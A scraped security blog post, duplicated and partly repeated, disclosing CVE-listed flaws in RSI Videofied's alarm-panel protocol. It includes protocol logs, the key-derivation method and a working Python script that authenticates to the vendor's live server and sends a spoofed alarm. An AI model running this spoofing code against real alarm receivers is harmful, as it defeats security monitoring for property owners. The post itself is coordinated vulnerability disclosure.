from Crypto import Random

# 4i Security's server and port
rsi_server = 'rsi.videofied.com'
rsi_port = 888
# This is the valid alarm serial
serial = 'A3AAA3AAA2AAAAAA'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((rsi_server, rsi_port))

# Open a connection to the server should see
# IDENT,1000
print 'R:',s.recv(1024)

# This is the valid serial number from the board
msg = 'IDENT,' + serial + ',2\x1a'
print 'S:', msg
s.send(msg)

# Should receive
# VERSION,2,0
print 'R:', s.recv(1024)

# AUTH1,<16 byte challege>
auth1 = s.recv(1024)
print 'R:', auth1

# Split out challenge
challenge = auth1.split(',')[-1][:-1]
print 'Challenge:', challenge

# The key is just a jumbled up serial.
# This means the key is entirely deterministic and can be guessed from one sniffed packet.
key = serial[4] + '0' + serial[15] + serial[11] + '0' + serial[5] + serial[13] + serial[6] + serial[8] + serial[12] + serial[7] + serial[14] + '1' + '0' \
    + serial[10] + serial[9] + serial[7] + serial[10] + serial [4] + serial[15] + serial[13] + serial[6] + serial[12] + '0' + serial[8] + '0' + serial[14] + \
    '1' + serial[11] + serial[11] + '0' + serial[5]

cipher = AES.new(key.decode('hex'))

# Encrypt in EBC mode
response = cipher.encrypt(challenge.decode('hex')).encode('hex').upper()

print 'Response:', response

# Generate our own random challange
challenge = Random.new().read(16).encode('hex').upper()

# Send back response in form:
# AUTH2,<16 byte response>,<16 byte challenge>
msg = 'AUTH2,' + response + ',' + challenge + '\x1a'

print 'S:', msg
s.send(msg)

# Calculate the expected response
print 'Expected Response', cipher.encrypt(challenge.decode('hex')).encode('hex').upper()

# This should be the encrypted response from the server
print 'R:', s.recv(1024)

# Send capture status message
msg = 'AUTH_SUCCESS,1440,1,20150729232041,5,2,E2612123110,0,XLP052300,0,27F7\x1aALARM,1932\x1a'
print 'S:', msg
s.send(msg)

print s.recv(1024)
```

Clearly this is not good.

## Authentication decoupled from identity

The above authentication ensures that a given panel with a serial number knows the key. Even if this key was secret and non-deterministic, it is entirely decoupled from the identity of the account. The account is the piece of information identifying the panel to the alarm receiving centre.

Notice that in the above authentication, the account number 1440 is not encrypted or linked to the panel serial:

```
R: IDENT,1000.
S: IDENT,EA00121513080139,2.
R: VERSION2,0.AUTH1,9301D4E13A1CDF51F873C790AFD602AF.
S: AUTH2,91A4E381AF21ECEB010FA0EE83021D48,D8717F423736A1F01510D25E919A3ED2.
R: AUTH3,8EE8E00CFEFEF83C76D34A6B7EC4BB23.
S: AUTH_SUCCESS,1440,1,20150729232041,5,2,E2612123110,0,XLP052300,0,27F7.ALARM,
```

It turns out that we can simply re-program the panel to use site 1441, and it will report into the alarm receiving centre as account 1441. There is no tie to the serial number, and no authentication of the account number.

## Other basic crypto failings

Beyond the authentication being totally broken, the protocol suffers from further basic issues:

* Nothing is encrypted – anyone can view the content of the messages, including the videos.
* There is no integrity protection such as a message authentication code or even a checksum, meaning that it is easy for messages to be altered deliberately or by accident.
* There are no sequence numbers, which means that messages can be replayed and there is no end-to-end acknowledgement of alarm reception

## Conclusion

The RSI Videofied system has a level of security that is worthless. It looks like they tried something and used a common algorithm – AES – but messed it up so badly that they may as well have stuck with plaintext.

### Share this:

* [Twitter](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?share=custom-1371585913 "Click to share on Twitter")
* [Facebook](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?share=facebook "Click to share on Facebook")
* [Reddit](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?share=reddit "Click to share on Reddit")

This entry was posted in [Alarms](https://cybergibbons.com/category/alarms-2/), [Security](https://cybergibbons.com/category/security-2/). Bookmark the [permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/ "Permalink to Multiple serious vulnerabilities in RSI Videofied’s alarm protocol").

## 11 thoughts on “Multiple serious vulnerabilities in RSI Videofied’s alarm protocol”

1. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428103)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428103#respond)
   #### [RSI Videofied Security Alarm Protocol Flawed, Attackers Can Intercept Alarms | Wolf Halton, Open-Source Security](http://wolfhalton.info/2015/11/30/rsi-videofied-security-alarm-protocol-flawed-attackers-can-intercept-alarms/)

   November 30, 2015 at 5:36pm

   […] Videofied is a French manufacturer of alarm systems. According to research carried out by Cybergibbons Limited, one of their recently launched alarm system lines ha… (read more) Source: […]
3. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428108)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428108#respond)
   #### [VU#792004: RSI Video Technologies Videofied security system Frontel software uses an insecure custom protocol - Varanoid.com](http://www.varanoid.com/research-alerts/us-cert/vu792004-rsi-video-technologies-videofied-security-system-frontel-software-uses-an-insecure-custom-protocol/)

   November 30, 2015 at 5:58pm

   […] For more information, please see the researcher’s blog post. […]
5. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428134)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428134#respond)
   #### [VU#792004: RSI Video Technologies Videofied security system Frontel software uses an insecure custom protocol - cPanel Knowledge](http://www.cpanelknowledge.com/vu792004-rsi-video-technologies-videofied-security-system-frontel-software-uses-an-insecure-custom-protocol/)

   November 30, 2015 at 9:53pm

   […] For more information, please see the researcher’s blog post. […]
7. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428198)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428198#respond)
   #### [Videofied Alarm System Flaws Allow Hackers to Intercept Data | Cyber Security News](https://cyber-security.news/videofied-alarm-system-flaws-allow-hackers-to-intercept-data)

   December 1, 2015 at 11:14am

   […] with UK-based security consultancy Cybergibbons analyzed W Panel, one of the Videofied control panels designed for use in residential, small business and […]
9. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428625)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428625#respond)
   #### [Videofied Alarm System Flaws, Allow Hackers to Intercept Data | »XoZZeN«](http://www.xozzen.com/blog/videofied-alarm-system-flaws-allow-hackers-to-intercept-data/)

   December 4, 2015 at 1:53pm

   […] and videos when an alarm is triggered. Researchers with UK-based security consultancy Cybergibbons analyzed W Panel, one of the Videofied control panels designed for use in residential, small business and […]
11. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432107)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432107#respond)
    #### [SB15-363: Vulnerability Summary for the Week of December 21, 2015 « CyberSafe NV](http://cybersafenv.org/sb15-363-vulnerability-summary-for-the-week-of-december-21-2015/)

    December 29, 2015 at 5:38pm

    […] CVE-2015-8252CERT-VNMISC […]
13. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432126)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432126#respond)
    #### [SB15-363: Vulnerability Summary for the Week of December 21, 2015 - Varanoid.com](http://www.varanoid.com/research-alerts/us-cert/sb15-363-vulnerability-summary-for-the-week-of-december-21-2015/)

    December 29, 2015 at 10:01pm

    […] CVE-2015-8252CERT-VNMISC […]
15. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432865)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432865#respond)
    #### [SB16-004: Vulnerability Summary for the Week of December 28, 2015 « CyberSafe NV](http://cybersafenv.org/sb16-004-vulnerability-summary-for-the-week-of-december-28-2015/)

    January 4, 2016 at 3:58pm

    […] CVE-2015-8252CERT-VNMISC […]
17. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432875)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432875#respond)
    #### [SB16-004: Vulnerability Summary for the Week of December 28, 2015 - Varanoid.com](http://www.varanoid.com/research-alerts/us-cert/sb16-004-vulnerability-summary-for-the-week-of-december-28-2015/)

    January 4, 2016 at 4:53pm

    […] CVE-2015-8252CERT-VNMISC […]
19. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432924)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432924#respond)
    #### [SB16-004: Vulnerability Summary for the Week of December 28, 2015 | 007 Software](http://007software.net/sb16-004-vulnerability-summary-for-the-week-of-december-28-2015/)

    January 5, 2016 at 2:51am

    […] CVE-2015-8252CERT-VNMISC […]
21. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-433412)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=433412#respond)
    #### [SB15-363 Vulnerability Summary for the Week of December 21st 2015 | ECI Networks](http://ecinetworks.com/sb15-363-vulnerability-summary-for-the-week-of-december-21st-2015/)

    January 8, 2016 at 6:07pm

    […] CVE-2015-8252 CERT-VN MISC […]

### Leave a Reply [Cancel reply](/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#respond)

Your email will not be published. Name and Email fields are required.

CommentName
Email
Website

 Notify me of follow-up comments by email.

 Notify me of new posts by email.

Δ

This site uses Akismet to reduce spam. [Learn how your comment data is processed](https://akismet.com/privacy/).

# Categories

* [Alarms](https://cybergibbons.com/category/alarms-2/) (48)
  + [Alarm technologies](https://cybergibbons.com/category/alarms-2/alarm-technologies/) (5)
  + [Friedland Response reverse engineering](https://cybergibbons.com/category/alarms-2/friedland-response-reverse-engineering/) (8)
  + [Signalling devices](https://cybergibbons.com/category/alarms-2/signalling-devices/) (19)
* [Arduino](https://cybergibbons.com/category/arduino/) (9)
* [Cycling](https://cybergibbons.com/category/cycling/) (1)
* [Electronics](https://cybergibbons.com/category/electronics/) (5)
* [General tips](https://cybergibbons.com/category/general-tips/) (1)
* [Hardware Hacking](https://cybergibbons.com/category/hardware-hacking/) (10)
* [Heat pump monitor](https://cybergibbons.com/category/heat-pump-monitor/) (3)
* [Linux](https://cybergibbons.com/category/linux/) (1)
* [Lockpicking](https://cybergibbons.com/category/lockpicking-2/) (2)
* [Opinion](https://cybergibbons.com/category/opinion/) (3)
* [Quadcopter](https://cybergibbons.com/category/quadcopter/) (2)
* [Reverse Engineering](https://cybergibbons.com/category/reverse-engineering-2/) (17)
* [Reviews](https://cybergibbons.com/category/reviews/) (8)
  + [StickNFind](https://cybergibbons.com/category/reviews/sticknfind/) (8)
* [Security](https://cybergibbons.com/category/security-2/) (82)
  + [Bitfi](https://cybergibbons.com/category/security-2/bitfi/) (4)
  + [Burp Suite](https://cybergibbons.com/category/security-2/burp-suite/) (1)
  + [Nebula walkthrough](https://cybergibbons.com/category/security-2/nebula-walkthrough/) (11)
  + [Shodan Searches](https://cybergibbons.com/category/security-2/shodan-searches/) (8)
* [Uncategorized](https://cybergibbons.com/category/uncategorized/) (52)
# Tweets!

[My Tweets](https://twitter.com/cybergibbons)

* [RSS - Posts](https://cybergibbons.com/feed/ "Subscribe to posts")
* [RSS - Comments](https://cybergibbons.com/comments/feed/ "Subscribe to comments")

Powered by [WordPress](http://wordpress.org/). [Debut](https://github.com/kwight/debut/) theme by kwight.



=== Content from cybergibbons.com_8b3dd685_20250125_214724.html ===

# Menu

[Skip to content](#content)
Menu

* [Home](https://cybergibbons.com/)
* [About](https://cybergibbons.com/about-2/)
* [Contact](https://cybergibbons.com/contact/)
* [PGP key](https://cybergibbons.com/pgp-key/)

# [Cybergibbons](https://cybergibbons.com/)

## Reverse engineer, hardware hacker, security analyst, lock picker, heist planner. Definitely not involved in the Hatton Garden job.

Search

# Menu

[Skip to content](#content)

* [Home](https://cybergibbons.com/)
* [About](https://cybergibbons.com/about-2/)
* [Contact](https://cybergibbons.com/contact/)
* [PGP key](https://cybergibbons.com/pgp-key/)

# Multiple serious vulnerabilities in RSI Videofied’s alarm protocol

Posted on [November 30, 2015](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/) by [cybergibbons](https://cybergibbons.com/author/cybergibbons/ "View all posts by cybergibbons")

[RSI Videofied](http://www.videofied.com/eu/uk/home/) are a French company that produce a series of alarm panels that are fairly unique in the market. They are designed to be battery powered and send videos from the detectors if the alarm is triggered. This is called video verification. They are frequently used on building sites and disused buildings.

They send data over either GPRS (mobile) or IP. Whilst reverse engineering as part of competitor analysis for a client, I found a large number of vulnerabilities in the protocol they use to communicate.

In summary, the protocol is so broken that it provides no security, allowing an attacker to easily spoof or intercept alarms.

As appears to be the norm in the physical security world, the vendor failed to respond over the course of 6 weeks, so this was taken to CERT/CC for disclosure. ~~They are due for disclosure 30 November 2015.~~ CERT/CC have [released their report.](http://www.kb.cert.org/vuls/id/792004)

The issues were found in their newest [W Panels](https://www.videofied.com/eu/uk/products/w_panel/) in mid-2015.

The following CVEs have been assigned:

* CWE-321: Use of Hard-coded Cryptographic Key – CVE-2015-8252
* CWE-311: Missing Encryption of Sensitive Data – CVE-2015-8253
* CWE-345: Insufficient Verification of Data Authenticity – CVE-2015-8254

RSI Videofied have stated to CERT/CC that this is fixed in version 3 of their protocol which is currently being rolled out.

## Weak authentication

When the panel initially communicates with the receiving server, there is an authentication handshake (R is received by panel, S is sent by panel)

```
R: IDENT,1000.
S: IDENT,EA00121513080139,2.
R: VERSION2,0.AUTH1,9301D4E13A1CDF51F873C790AFD602AF.
S: AUTH2,91A4E381AF21ECEB010FA0EE83021D48,D8717F423736A1F01510D25E919A3ED2.
R: AUTH3,8EE8E00CFEFEF83C76D34A6B7EC4BB23.
S: AUTH_SUCCESS,1440,1,20150729232041,5,2,E2612123110,0,XLP052300,0,27F7.ALARM,
```

This looks like some kind of challenge/response. EA00121513080139 is the panel’s serial number. 1440 is the account number for that particular panel.

Brief entropy analysis of the long strings in AUTH1, AUTH2, and AUTH3 showed them to be random.

A Python script was created to mimic the panel.

It was noted that if the serial number was altered, the response was different:

```
R: IDENT,1000
S: IDENT,EA00121513080136,2
R: SETKEY,10680211105310035016110010318802
R: VERSION,2,0 AUTH1,D5689F494D81ECA07E72CC0F3459ED4E
```

It appears that the first time a particular server sees a serial number, it informs the panel of the key used for the challenge/response. If we then attempt to connect again, the key is not shown to us.

It was then seen that connecting the panel to a new server at a different alarm receiving centre delivered exactly the same key. This means that the key is deterministic. It also means that to obtain the key for any given panel, all we need to do is send the serial number to another Videofied server (of which there are many).

However, we can go further than this. Notice that the key delivered above has a lot of common numbers with the serial number. It appears that the key is just a mixed up serial number:

```
R: IDENT,1000
S: IDENT,0000000000000000,2
R: SETKEY,00000000000010000000000000010000 VERSION,2,0 A
R: AUTH1,6587DA1323597F4AC986936BAF20102B

R: IDENT,1000
S: IDENT,0000000000000020,2
R: SETKEY,00000000000210000000000000210000
R: VERSION,2,0 AUTH1,0A79588F06FEB594D153237230BA0D61

R: IDENT,1000
S: IDENT,0123456789ABCDEF,2
R: SETKEY,40FB05D68C7E10A97A4FD6C080E1BB05
R: VERSION,2,0 AUTH1,D4F98DF37EF53F52505599D833484658
```

This means that we can trivially determine the key used for authentication using the serial number that is sent in the plain immediately beforehand.

The challenge response protocol is as follows:

```
Server: Random server challenge
Panel:  AES(Random server challenge, key) | Random panel challenge
Server: AES(Random panel challenge, key)
```

Now that we have the key, it is very easy for us to spoof this.

```
import socket
from Crypto.Cipher import AES
from Crypto import Random

# 4i Security's server and port
rsi_server = 'rsi.videofied.com'
rsi_port = 888
# This is the valid alarm serial
serial = 'A3AAA3AAA2AAAAAA'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((rsi_server, rsi_port))

# Open a connection to the server should see
# IDENT,1000
print 'R:',s.recv(1024)

# This is the valid serial number from the board
msg = 'IDENT,' + serial + ',2\x1a'
print 'S:', msg
s.send(msg)

# Should receive
# VERSION,2,0
print 'R:', s.recv(1024)

# AUTH1,<16 byte challege>
auth1 = s.recv(1024)
print 'R:', auth1

# Split out challenge
challenge = auth1.split(',')[-1][:-1]
print 'Challenge:', challenge

# The key is just a jumbled up serial.
# This means the key is entirely deterministic and can be guessed from one sniffed packet.
key = serial[4] + '0' + serial[15] + serial[11] + '0' + serial[5] + serial[13] + serial[6] + serial[8] + serial[12] + serial[7] + serial[14] + '1' + '0' \
    + serial[10] + serial[9] + serial[7] + serial[10] + serial [4] + serial[15] + serial[13] + serial[6] + serial[12] + '0' + serial[8] + '0' + serial[14] + \
    '1' + serial[11] + serial[11] + '0' + serial[5]

cipher = AES.new(key.decode('hex'))

# Encrypt in EBC mode
response = cipher.encrypt(challenge.decode('hex')).encode('hex').upper()

print 'Response:', response

# Generate our own random challange
challenge = Random.new().read(16).encode('hex').upper()

# Send back response in form:
# AUTH2,<16 byte response>,<16 byte challenge>
msg = 'AUTH2,' + response + ',' + challenge + '\x1a'

print 'S:', msg
s.send(msg)

# Calculate the expected response
print 'Expected Response', cipher.encrypt(challenge.decode('hex')).encode('hex').upper()

# This should be the encrypted response from the server
print 'R:', s.recv(1024)

# Send capture status message
msg = 'AUTH_SUCCESS,1440,1,20150729232041,5,2,E2612123110,0,XLP052300,0,27F7\x1aALARM,1932\x1a'
print 'S:', msg
s.send(msg)

print s.recv(1024)
```

Clearly this is not good.

## Authentication decoupled from identity

The above authentication ensures that a given panel with a serial number knows the key. Even if this key was secret and non-deterministic, it is entirely decoupled from the identity of the account. The account is the piece of information identifying the panel to the alarm receiving centre.

Notice that in the above authentication, the account number 1440 is not encrypted or linked to the panel serial:

```
R: IDENT,1000.
S: IDENT,EA00121513080139,2.
R: VERSION2,0.AUTH1,9301D4E13A1CDF51F873C790AFD602AF.
S: AUTH2,91A4E381AF21ECEB010FA0EE83021D48,D8717F423736A1F01510D25E919A3ED2.
R: AUTH3,8EE8E00CFEFEF83C76D34A6B7EC4BB23.
S: AUTH_SUCCESS,1440,1,20150729232041,5,2,E2612123110,0,XLP052300,0,27F7.ALARM,
```

It turns out that we can simply re-program the panel to use site 1441, and it will report into the alarm receiving centre as account 1441. There is no tie to the serial number, and no authentication of the account number.

## Other basic crypto failings

Beyond the authentication being totally broken, the protocol suffers from further basic issues:

* Nothing is encrypted – anyone can view the content of the messages, including the videos.
* There is no integrity protection such as a message authentication code or even a checksum, meaning that it is easy for messages to be altered deliberately or by accident.
* There are no sequence numbers, which means that messages can be replayed and there is no end-to-end acknowledgement of alarm reception

## Conclusion

The RSI Videofied system has a level of security that is worthless. It looks like they tried something and used a common algorithm – AES – but messed it up so badly that they may as well have stuck with plaintext.

### Share this:

* [Twitter](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?share=custom-1371585913 "Click to share on Twitter")
* [Facebook](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?share=facebook "Click to share on Facebook")
* [Reddit](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?share=reddit "Click to share on Reddit")

This entry was posted in [Alarms](https://cybergibbons.com/category/alarms-2/), [Security](https://cybergibbons.com/category/security-2/). Bookmark the [permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/ "Permalink to Multiple serious vulnerabilities in RSI Videofied’s alarm protocol").

## 11 thoughts on “Multiple serious vulnerabilities in RSI Videofied’s alarm protocol”

1. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428103)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428103#respond)
   #### [RSI Videofied Security Alarm Protocol Flawed, Attackers Can Intercept Alarms | Wolf Halton, Open-Source Security](http://wolfhalton.info/2015/11/30/rsi-videofied-security-alarm-protocol-flawed-attackers-can-intercept-alarms/)

   November 30, 2015 at 5:36pm

   […] Videofied is a French manufacturer of alarm systems. According to research carried out by Cybergibbons Limited, one of their recently launched alarm system lines ha… (read more) Source: […]
3. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428108)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428108#respond)
   #### [VU#792004: RSI Video Technologies Videofied security system Frontel software uses an insecure custom protocol - Varanoid.com](http://www.varanoid.com/research-alerts/us-cert/vu792004-rsi-video-technologies-videofied-security-system-frontel-software-uses-an-insecure-custom-protocol/)

   November 30, 2015 at 5:58pm

   […] For more information, please see the researcher’s blog post. […]
5. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428134)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428134#respond)
   #### [VU#792004: RSI Video Technologies Videofied security system Frontel software uses an insecure custom protocol - cPanel Knowledge](http://www.cpanelknowledge.com/vu792004-rsi-video-technologies-videofied-security-system-frontel-software-uses-an-insecure-custom-protocol/)

   November 30, 2015 at 9:53pm

   […] For more information, please see the researcher’s blog post. […]
7. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428198)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428198#respond)
   #### [Videofied Alarm System Flaws Allow Hackers to Intercept Data | Cyber Security News](https://cyber-security.news/videofied-alarm-system-flaws-allow-hackers-to-intercept-data)

   December 1, 2015 at 11:14am

   […] with UK-based security consultancy Cybergibbons analyzed W Panel, one of the Videofied control panels designed for use in residential, small business and […]
9. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428625)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428625#respond)
   #### [Videofied Alarm System Flaws, Allow Hackers to Intercept Data | »XoZZeN«](http://www.xozzen.com/blog/videofied-alarm-system-flaws-allow-hackers-to-intercept-data/)

   December 4, 2015 at 1:53pm

   […] and videos when an alarm is triggered. Researchers with UK-based security consultancy Cybergibbons analyzed W Panel, one of the Videofied control panels designed for use in residential, small business and […]
11. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432107)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432107#respond)
    #### [SB15-363: Vulnerability Summary for the Week of December 21, 2015 « CyberSafe NV](http://cybersafenv.org/sb15-363-vulnerability-summary-for-the-week-of-december-21-2015/)

    December 29, 2015 at 5:38pm

    […] CVE-2015-8252CERT-VNMISC […]
13. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432126)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432126#respond)
    #### [SB15-363: Vulnerability Summary for the Week of December 21, 2015 - Varanoid.com](http://www.varanoid.com/research-alerts/us-cert/sb15-363-vulnerability-summary-for-the-week-of-december-21-2015/)

    December 29, 2015 at 10:01pm

    […] CVE-2015-8252CERT-VNMISC […]
15. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432865)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432865#respond)
    #### [SB16-004: Vulnerability Summary for the Week of December 28, 2015 « CyberSafe NV](http://cybersafenv.org/sb16-004-vulnerability-summary-for-the-week-of-december-28-2015/)

    January 4, 2016 at 3:58pm

    […] CVE-2015-8252CERT-VNMISC […]
17. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432875)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432875#respond)
    #### [SB16-004: Vulnerability Summary for the Week of December 28, 2015 - Varanoid.com](http://www.varanoid.com/research-alerts/us-cert/sb16-004-vulnerability-summary-for-the-week-of-december-28-2015/)

    January 4, 2016 at 4:53pm

    […] CVE-2015-8252CERT-VNMISC […]
19. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432924)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432924#respond)
    #### [SB16-004: Vulnerability Summary for the Week of December 28, 2015 | 007 Software](http://007software.net/sb16-004-vulnerability-summary-for-the-week-of-december-28-2015/)

    January 5, 2016 at 2:51am

    […] CVE-2015-8252CERT-VNMISC […]
21. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-433412)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=433412#respond)
    #### [SB15-363 Vulnerability Summary for the Week of December 21st 2015 | ECI Networks](http://ecinetworks.com/sb15-363-vulnerability-summary-for-the-week-of-december-21st-2015/)

    January 8, 2016 at 6:07pm

    […] CVE-2015-8252 CERT-VN MISC […]

### Leave a Reply [Cancel reply](/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#respond)

Your email will not be published. Name and Email fields are required.

CommentName
Email
Website

 Notify me of follow-up comments by email.

 Notify me of new posts by email.

Δ

This site uses Akismet to reduce spam. [Learn how your comment data is processed](https://akismet.com/privacy/).

# Categories

* [Alarms](https://cybergibbons.com/category/alarms-2/) (48)
  + [Alarm technologies](https://cybergibbons.com/category/alarms-2/alarm-technologies/) (5)
  + [Friedland Response reverse engineering](https://cybergibbons.com/category/alarms-2/friedland-response-reverse-engineering/) (8)
  + [Signalling devices](https://cybergibbons.com/category/alarms-2/signalling-devices/) (19)
* [Arduino](https://cybergibbons.com/category/arduino/) (9)
* [Cycling](https://cybergibbons.com/category/cycling/) (1)
* [Electronics](https://cybergibbons.com/category/electronics/) (5)
* [General tips](https://cybergibbons.com/category/general-tips/) (1)
* [Hardware Hacking](https://cybergibbons.com/category/hardware-hacking/) (10)
* [Heat pump monitor](https://cybergibbons.com/category/heat-pump-monitor/) (3)
* [Linux](https://cybergibbons.com/category/linux/) (1)
* [Lockpicking](https://cybergibbons.com/category/lockpicking-2/) (2)
* [Opinion](https://cybergibbons.com/category/opinion/) (3)
* [Quadcopter](https://cybergibbons.com/category/quadcopter/) (2)
* [Reverse Engineering](https://cybergibbons.com/category/reverse-engineering-2/) (17)
* [Reviews](https://cybergibbons.com/category/reviews/) (8)
  + [StickNFind](https://cybergibbons.com/category/reviews/sticknfind/) (8)
* [Security](https://cybergibbons.com/category/security-2/) (82)
  + [Bitfi](https://cybergibbons.com/category/security-2/bitfi/) (4)
  + [Burp Suite](https://cybergibbons.com/category/security-2/burp-suite/) (1)
  + [Nebula walkthrough](https://cybergibbons.com/category/security-2/nebula-walkthrough/) (11)
  + [Shodan Searches](https://cybergibbons.com/category/security-2/shodan-searches/) (8)
* [Uncategorized](https://cybergibbons.com/category/uncategorized/) (52)
# Tweets!

[My Tweets](https://twitter.com/cybergibbons)

* [RSS - Posts](https://cybergibbons.com/feed/ "Subscribe to posts")
* [RSS - Comments](https://cybergibbons.com/comments/feed/ "Subscribe to comments")

Powered by [WordPress](http://wordpress.org/). [Debut](https://github.com/kwight/debut/) theme by kwight.



=== Content from cybergibbons.com_8d755996_20250126_121442.html ===

# Menu

[Skip to content](#content)
Menu

* [Home](https://cybergibbons.com/)
* [About](https://cybergibbons.com/about-2/)
* [Contact](https://cybergibbons.com/contact/)
* [PGP key](https://cybergibbons.com/pgp-key/)

# [Cybergibbons](https://cybergibbons.com/)

## Reverse engineer, hardware hacker, security analyst, lock picker, heist planner. Definitely not involved in the Hatton Garden job.

Search

# Menu

[Skip to content](#content)

* [Home](https://cybergibbons.com/)
* [About](https://cybergibbons.com/about-2/)
